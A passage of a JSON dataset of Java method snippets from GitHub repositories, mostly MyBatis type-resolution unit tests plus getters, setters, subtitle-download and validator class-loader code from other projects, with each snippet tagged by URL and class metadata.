result;    assertTrue(resultClass.isArray());    assertEquals(String.class, resultClass.getComponentType());  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testReturn_Lv2ArrayOfArray", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testReturn_Lv2ArrayOfArray() throws Exception {    Class<?> clazz = Level2Mapper.class;    Method method = clazz.getMethod(\"selectArrayOfArray\");    Type result = TypeParameterResolver.resolveReturnType(method, clazz);    assertTrue(result instanceof Class);    Class<?> resultClass = (Class<?>) result;    assertTrue(result instanceof Class);    assertTrue(resultClass.isArray());    assertTrue(resultClass.getComponentType().isArray());    assertEquals(String.class, resultClass.getComponentType().getComponentType());  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testReturn_Lv2ArrayOfList", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testReturn_Lv2ArrayOfList() throws Exception {    Class<?> clazz = Level2Mapper.class;    Method method = clazz.getMethod(\"selectArrayOfList\");    Type result = TypeParameterResolver.resolveReturnType(method, clazz);    assertTrue(result instanceof GenericArrayType);    GenericArrayType genericArrayType = (GenericArrayType) result;    assertTrue(genericArrayType.getGenericComponentType() instanceof ParameterizedType);    ParameterizedType paramType = (ParameterizedType) genericArrayType.getGenericComponentType();    assertEquals(List.class, paramType.getRawType());    assertEquals(String.class, paramType.getActualTypeArguments()[0]);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testReturn_Lv2WildcardList", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testReturn_Lv2WildcardList() throws Exception {    Class<?> clazz = Level2Mapper.class;    Method method = clazz.getMethod(\"selectWildcardList\");    Type result = TypeParameterResolver.resolveReturnType(method, clazz);    assertTrue(result instanceof ParameterizedType);    ParameterizedType type = (ParameterizedType) result;    assertEquals(List.class, type.getRawType());    assertEquals(1, type.getActualTypeArguments().length);    assertTrue(type.getActualTypeArguments()[0] instanceof WildcardType);    WildcardType wildcard = (WildcardType) type.getActualTypeArguments()[0];    assertEquals(0, wildcard.getLowerBounds().length);    assertEquals(1, wildcard.getUpperBounds().length);    assertEquals(String.class, wildcard.getUpperBounds()[0]);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testReturn_LV2Map", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testReturn_LV2Map() throws Exception {    Class<?> clazz = Level2Mapper.class;    Method method = clazz.getMethod(\"selectMap\");    Type result = TypeParameterResolver.resolveReturnType(method, clazz);    assertTrue(result instanceof ParameterizedType);    ParameterizedType paramType = (ParameterizedType) result;    assertEquals(Map.class, paramType.getRawType());    assertEquals(2, paramType.getActualTypeArguments().length);    assertEquals(String.class, paramType.getActualTypeArguments()[0]);    assertEquals(Integer.class, paramType.getActualTypeArguments()[1]);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testReturn_Subclass", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testReturn_Subclass() throws Exception {    Class<?> clazz = SubCalculator.class;    Method method = clazz.getMethod(\"getId\");    Type result = TypeParameterResolver.resolveReturnType(method, clazz);    assertEquals(String.class, result);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testParam_Primitive", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testParam_Primitive() throws Exception {    Class<?> clazz = Level2Mapper.class;    Method method = clazz.getMethod(\"simpleSelectPrimitive\", int.class);    Type[] result = TypeParameterResolver.resolveParamTypes(method, clazz);    assertEquals(1, result.length);    assertEquals(int.class, result[0]);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testParam_Simple", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testParam_Simple() throws Exception {    Class<?> clazz = Level1Mapper.class;    Method method = clazz.getMethod(\"simpleSelectVoid\", Integer.class);    Type[] result = TypeParameterResolver.resolveParamTypes(method, clazz);    assertEquals(1, result.length);    assertEquals(Integer.class, result[0]);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testParam_Lv1Single", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testParam_Lv1Single() throws Exception {    Class<?> clazz = Level1Mapper.class;    Method method = clazz.getMethod(\"select\", Object.class);    Type[] result = TypeParameterResolver.resolveParamTypes(method, clazz);    assertEquals(1, result.length);    assertEquals(String.class, result[0]);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testParam_Lv2Single", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testParam_Lv2Single() throws Exception {    Class<?> clazz = Level2Mapper.class;    Method method = clazz.getMethod(\"select\", Object.class);    Type[] result = TypeParameterResolver.resolveParamTypes(method, clazz);    assertEquals(1, result.length);    assertEquals(String.class, result[0]);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testParam_Lv2Multiple", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testParam_Lv2Multiple() throws Exception {    Class<?> clazz = Level2Mapper.class;    Method method = clazz.getMethod(\"selectList\", Object.class, Object.class);    Type[] result = TypeParameterResolver.resolveParamTypes(method, clazz);    assertEquals(2, result.length);    assertEquals(Integer.class, result[0]);    assertEquals(String.class, result[1]);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testParam_Lv2CustomClass", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testParam_Lv2CustomClass() throws Exception {    Class<?> clazz = Level2Mapper.class;    Method method = clazz.getMethod(\"selectCalculator\", Calculator.class);    Type[] result = TypeParameterResolver.resolveParamTypes(method, clazz);    assertEquals(1, result.length);    assertTrue(result[0] instanceof ParameterizedType);    ParameterizedType paramType = (ParameterizedType) result[0];    assertEquals(Calculator.class, paramType.getRawType());    assertEquals(1, paramType.getActualTypeArguments().length);    assertEquals(String.class, paramType.getActualTypeArguments()[0]);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testParam_Lv1Array", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testParam_Lv1Array() throws Exception {    Class<?> clazz = Level1Mapper.class;    Method method = clazz.getMethod(\"selectArray\", List[].class);    Type[] result = TypeParameterResolver.resolveParamTypes(method, clazz);    assertTrue(result[0] instanceof GenericArrayType);    GenericArrayType genericArrayType = (GenericArrayType) result[0];    assertTrue(genericArrayType.getGenericComponentType() instanceof ParameterizedType);    ParameterizedType paramType = (ParameterizedType) genericArrayType.getGenericComponentType();    assertEquals(List.class, paramType.getRawType());    assertEquals(String.class, paramType.getActualTypeArguments()[0]);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testParam_Subclass", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testParam_Subclass() throws Exception {    Class<?> clazz = SubCalculator.class;    Method method = clazz.getMethod(\"setId\", Object.class);    Type[] result = TypeParameterResolver.resolveParamTypes(method, clazz);    assertEquals(String.class, result[0]);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testReturn_Anonymous", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testReturn_Anonymous() throws Exception {    Calculator<?> instance = new Calculator<Integer>();    Class<?> clazz = instance.getClass();    Method method = clazz.getMethod(\"getId\");    Type result = TypeParameterResolver.resolveReturnType(method, clazz);    assertEquals(Object.class, result);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testField_GenericField", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testField_GenericField() throws Exception {    Class<?> clazz = SubCalculator.class;    Class<?> declaredClass = Calculator.class;    Field field = declaredClass.getDeclaredField(\"fld\");    Type result = TypeParameterResolver.resolveFieldType(field, clazz);    assertEquals(String.class, result);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testReturnParam_WildcardWithUpperBounds", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testReturnParam_WildcardWithUpperBounds() throws Exception {    class Key {    }    @SuppressWarnings(\"unused\")    class KeyBean<S extends Key & Cloneable, T extends Key> {      private S key1;      private T key2;      public S getKey1() {        return key1;      }      public void setKey1(S key1) {        this.key1 = key1;      }      public T getKey2() {        return key2;      }      public void setKey2(T key2) {        this.key2 = key2;      }    }    Class<?> clazz = KeyBean.class;    Method getter1 = clazz.getMethod(\"getKey1\");    assertEquals(Key.class, TypeParameterResolver.resolveReturnType(getter1, clazz));    Method setter1 = clazz.getMethod(\"setKey1\", Key.class);    assertEquals(Key.class, TypeParameterResolver.resolveParamTypes(setter1, clazz)[0]);    Method getter2 = clazz.getMethod(\"getKey2\");    assertEquals(Key.class, TypeParameterResolver.resolveReturnType(getter2, clazz));    Method setter2 = clazz.getMethod(\"setKey2\", Key.class);    assertEquals(Key.class, TypeParameterResolver.resolveParamTypes(setter2, clazz)[0]);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testDeepHierarchy", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void testDeepHierarchy() throws Exception {    @SuppressWarnings(\"unused\")    abstract class A<S> {      protected S id;      public S getId() { return this.id;}      public void setId(S id) {this.id = id;}    }    abstract class B<T> extends A<T> {}    abstract class C<U> extends B<U> {}    class D extends C<Integer> {}    Class<?> clazz = D.class;    Method method = clazz.getMethod(\"getId\");    assertEquals(Integer.class, TypeParameterResolver.resolveReturnType(method, clazz));    Field field = A.class.getDeclaredField(\"id\");    assertEquals(Integer.class, TypeParameterResolver.resolveFieldType(field, clazz));  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "shouldTypeVariablesBeComparedWithEquals", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void shouldTypeVariablesBeComparedWithEquals() throws Exception {    // #1794    ExecutorService executor = Executors.newFixedThreadPool(2);    Future<Type> futureA = executor.submit(() -> {      Type retType = TypeParameterResolver.resolveReturnType(IfaceA.class.getMethods()[0], IfaceA.class);      return ((ParameterizedType) retType).getActualTypeArguments()[0];    });    Future<Type> futureB = executor.submit(() -> {      Type retType = TypeParameterResolver.resolveReturnType(IfaceB.class.getMethods()[0], IfaceB.class);      return ((ParameterizedType) retType).getActualTypeArguments()[0];    });    assertEquals(AA.class, futureA.get());    assertEquals(BB.class, futureB.get());    executor.shutdown();  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "TypeParameterResolverTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "getKey1", "params": [], "throws": null, "modifiers": ["public"], "return_type": "S", "snippet": "      public S getKey1() {        return key1;      }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "KeyBean", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "setKey1", "params": ["S"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "      public void setKey1(S key1) {        this.key1 = key1;      }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "KeyBean", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "getKey2", "params": [], "throws": null, "modifiers": ["public"], "return_type": "T", "snippet": "      public T getKey2() {        return key2;      }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "KeyBean", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "setKey2", "params": ["T"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "      public void setKey2(T key2) {        this.key2 = key2;      }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "KeyBean", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "getId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "S", "snippet": "      public S getId() { return this.id;}", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "A", "extends": null, "implements": null, "modifiers": ["abstract"]}}, {"method_name": "setId", "params": ["S"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "      public void setId(S id) {this.id = id;}", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/reflection/TypeParameterResolverTest.java", "stars": "15", "class": {"name": "A", "extends": null, "implements": null, "modifiers": ["abstract"]}}, {"method_name": "getLayoutId", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "int", "snippet": "    protected int getLayoutId() {        return R.layout.activity_about;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/AboutActivity.java", "stars": "1", "class": {"name": "AboutActivity", "extends": "MyActivity", "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "initView", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void initView() {    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/AboutActivity.java", "stars": "1", "class": {"name": "AboutActivity", "extends": "MyActivity", "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "initData", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void initData() {    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/ui/activity/AboutActivity.java", "stars": "1", "class": {"name": "AboutActivity", "extends": "MyActivity", "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "convertSelectionToString", "params": ["Object"], "throws": null, "modifiers": ["protected"], "return_type": "CharSequence", "snippet": "    protected CharSequence convertSelectionToString(Object selectedItem) {        /** Each item in the autocompetetextview suggestion list is a hashmap object */        HashMap<String, String> hm = (HashMap<String, String>) selectedItem;        return hm.get(\"txt\");    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/autocompletetextimagedemo/src/com/example/autocompletetextimagedemo/CustomAutoCompleteTextView.java", "stars": "74", "class": {"name": "CustomAutoCompleteTextView", "extends": "AutoCompleteTextView", "implements": null, "modifiers": ["public"]}}, {"method_name": "getExecutorAddress", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getExecutorAddress() {        return executorAddress;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/executor/domain/ExecuteResp.java", "stars": "23", "class": {"name": "ExecuteResp", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setExecutorAddress", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setExecutorAddress(String executorAddress) {        this.executorAddress = executorAddress;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/executor/domain/ExecuteResp.java", "stars": "23", "class": {"name": "ExecuteResp", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getStatus", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ExecuteStatus", "snippet": "    public ExecuteStatus getStatus() {        return status;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/executor/domain/ExecuteResp.java", "stars": "23", "class": {"name": "ExecuteResp", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setStatus", "params": ["ExecuteStatus"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setStatus(ExecuteStatus status) {        this.status = status;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/executor/domain/ExecuteResp.java", "stars": "23", "class": {"name": "ExecuteResp", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getMessage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getMessage() {        return message;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/executor/domain/ExecuteResp.java", "stars": "23", "class": {"name": "ExecuteResp", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setMessage", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMessage(String message) {        this.message = message;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/executor/domain/ExecuteResp.java", "stars": "23", "class": {"name": "ExecuteResp", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getTaskId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "    public Long getTaskId() {        return taskId;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/executor/domain/ExecuteResp.java", "stars": "23", "class": {"name": "ExecuteResp", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setTaskId", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTaskId(Long taskId) {        this.taskId = taskId;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/executor/domain/ExecuteResp.java", "stars": "23", "class": {"name": "ExecuteResp", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getExecUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getExecUser() {        return execUser;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/executor/domain/ExecuteResp.java", "stars": "23", "class": {"name": "ExecuteResp", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setExecUser", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setExecUser(String execUser) {        this.execUser = execUser;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/executor/domain/ExecuteResp.java", "stars": "23", "class": {"name": "ExecuteResp", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getStorageLocation", "params": ["Context"], "throws": null, "modifiers": ["public", "static"], "return_type": "File", "snippet": "    public static File getStorageLocation(Context context) {        return new File(PrefUtils.get(context, Prefs.STORAGE_LOCATION, StorageUtils.getIdealCacheDirectory(context).toString()) + \"/subs/\");    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/subs/SubsProvider.java", "stars": "4", "class": {"name": "SubsProvider", "extends": "BaseProvider", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "download", "params": ["Media", "String", "okhttp3"], "throws": null, "modifiers": ["public"], "return_type": "Call", "snippet": "    public Call download(final Media media, final String languageCode, final okhttp3.Callback callback) {        if (media.subtitles != null && media.subtitles.containsKey(languageCode)) {            try {                Request request = new Request.Builder().url(media.subtitles.get(languageCode)).build();                Call call = client.newCall(request);                final File subsDirectory = getStorageLocation(context);                final String fileName = media.videoId + \"-\" + languageCode;                final File srtPath = new File(subsDirectory, fileName + \".srt\");                if (srtPath.exists()) {                    callback.onResponse(null, null);                    return call;                }                call.enqueue(new okhttp3.Callback() {                    @Override                    public void onFailure(Call call, IOException e) {                        callback.onFailure(call, e);                    }                    @Override                    public void onResponse(Call call, Response response) throws IOException {                        if (response.isSuccessful()) {                            InputStream inputStream = null;                            boolean failure = false;                            try {                                if (!subsDirectory.mkdirs()) {                                    Timber.w(\"Could not create directory: \" + subsDirectory.getAbsolutePath());                                }                                if (srtPath.exists()) {                                    File to = new File(subsDirectory, \"temp\" + System.currentTimeMillis());                                    if (!srtPath.renameTo(to)) {                                        Timber.w(\"Could not rename file: \" + srtPath.getAbsolutePath());                                    }                                    if (!to.delete()) {                                        Timber.w(\"Could not delete file: \" + to.getAbsolutePath());                                    }                                }                                inputStream = response.body().byteStream();                                String urlString = response.request().url().toString();                                if (urlString.contains(\".zip\") || urlString.contains(\".gz\")) {                                    SubsProvider.unpack(inputStream, srtPath, languageCode);                                } else if (SubsProvider.isSubFormat(urlString)) {                                    parseFormatAndSave(urlString, srtPath, languageCode, inputStream);                                } else {                                    callback.onFailure(call, new IOException(\"FatalParsingException\"));                                    failure = true;                                }                            } catch (IOException e) {                                e.printStackTrace();                                callback.onFailure(call, e);                                failure = true;                            } finally {                                if (inputStream != null)                                    inputStream.close();                                if (!failure) callback.onResponse(call, response);                            }                        } else {                            callback.onFailure(call, new IOException(\"Unknown error\"));                        }                    }                });                return call;            } catch (RuntimeException | IOException e) {                e.printStackTrace();            }        }        callback.onFailure(null, new IOException(\"Wrong media\"));        return null;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/subs/SubsProvider.java", "stars": "4", "class": {"name": "SubsProvider", "extends": "BaseProvider", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "unpack", "params": ["InputStream", "File", "String"], "throws": ["IOException"], "modifiers": ["private", "static"], "return_type": "void", "snippet": "    private static void unpack(InputStream is, File srtPath, String languageCode) throws IOException {        String filename;        ZipInputStream zis = new ZipInputStream(new BufferedInputStream(is));        ZipEntry ze;        while ((ze = zis.getNextEntry()) != null) {            filename = ze.getName();            if (filename.contains(\"_MACOSX\")) continue;            if (isSubFormat(filename)) {                parseFormatAndSave(filename, srtPath, languageCode, zis);                try {                    zis.closeEntry();                } catch (IOException e) {                    e.printStackTrace();                }                return;            }        }        zis.close();    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/subs/SubsProvider.java", "stars": "4", "class": {"name": "SubsProvider", "extends": "BaseProvider", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "isSubFormat", "params": ["String"], "throws": null, "modifiers": ["private", "static"], "return_type": "boolean", "snippet": "    private static boolean isSubFormat(String filename) {        for (String ext : SUB_EXTENSIONS) {            if (filename.contains(\".\" + ext)) {                return true;            }        }        return false;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/subs/SubsProvider.java", "stars": "4", "class": {"name": "SubsProvider", "extends": "BaseProvider", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "parseFormatAndSave", "params": ["String", "File", "String", "InputStream"], "throws": ["IOException"], "modifiers": ["private", "static"], "return_type": "void", "snippet": "    private static void parseFormatAndSave(String inputUrl, File srtPath, String languageCode, InputStream inputStream) throws IOException {        TimedTextObject subtitleObject = null;        String inputString = FileUtils.inputstreamToCharsetString(inputStream, languageCode);        String[] inputText = inputString.split(\"\\n|\\r\\n\");        if (inputUrl.contains(\".ass\") || inputUrl.contains(\".ssa\")) {            FormatASS formatASS = new FormatASS();            subtitleObject = formatASS.parseFile(inputUrl, inputText);        } else if (inputUrl.contains(\".srt\")) {            FormatSRT formatSRT = new FormatSRT();            subtitleObject = formatSRT.parseFile(inputUrl, inputText);        }        if (subtitleObject != null) {            FileUtils.saveStringFile(subtitleObject.toSRT(), srtPath);        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/subs/SubsProvider.java", "stars": "4", "class": {"name": "SubsProvider", "extends": "BaseProvider", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getList", "params": ["Movie", "Callback"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void getList(Movie movie, Callback callback);    public abstract void getList(Episode episode, Callback callback);    public interface Callback {        void onSuccess(Map<String, String> items);        void onFailure(Exception e);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/subs/SubsProvider.java", "stars": "4", "class": {"name": "SubsProvider", "extends": "BaseProvider", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getList", "params": ["Episode", "Callback"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void getList(Episode episode, Callback callback);    public interface Callback {        void onSuccess(Map<String, String> items);        void onFailure(Exception e);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/providers/subs/SubsProvider.java", "stars": "4", "class": {"name": "SubsProvider", "extends": "BaseProvider", "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "checkResources", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void checkResources() {    final File validatorDir = new File(this.validatorDirPath);    final List<URL> resources = new ArrayList<>();    boolean reloadResources = false;    try {      if (validatorDir.canRead() && validatorDir.isDirectory()) {        for (final File f : validatorDir.listFiles()) {          if (f.getName().endsWith(\".jar\")) {            resources.add(f.toURI().toURL());            if (resourceTimestamps.get(f.getName()) == null                || resourceTimestamps.get(f.getName()) != f.lastModified()) {              reloadResources = true;              logger.info(\"Resource \" + f.getName() + \" is updated. Reload the classloader.\");              resourceTimestamps.put(f.getName(), f.lastModified());            }          }        }      }    } catch (final MalformedURLException e) {      throw new ValidatorManagerException(e);    }    if (reloadResources) {      if (validatorLoader != null) {        try {          // Since we cannot use Java 7 feature inside Azkaban (....), we need a customized class loader          // that does the close for us.          validatorLoader.close();        } catch (final ValidatorManagerException e) {          logger.error(\"Cannot reload validator classloader because failure \"              + \"to close the validator classloader.\", e);          // We do not throw the ValidatorManagerException because we do not want to crash Azkaban at runtime.        }      }      validatorLoader = new ValidatorClassLoader(resources.toArray(new URL[resources.size()]));    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/azkaban/project/validator/XmlValidatorManager.java", "stars": "18", "class": {"name": "XmlValidatorManager", "extends": null, "implements": ["ValidatorManager"], "modifiers": ["public"]}}, {"method_name": 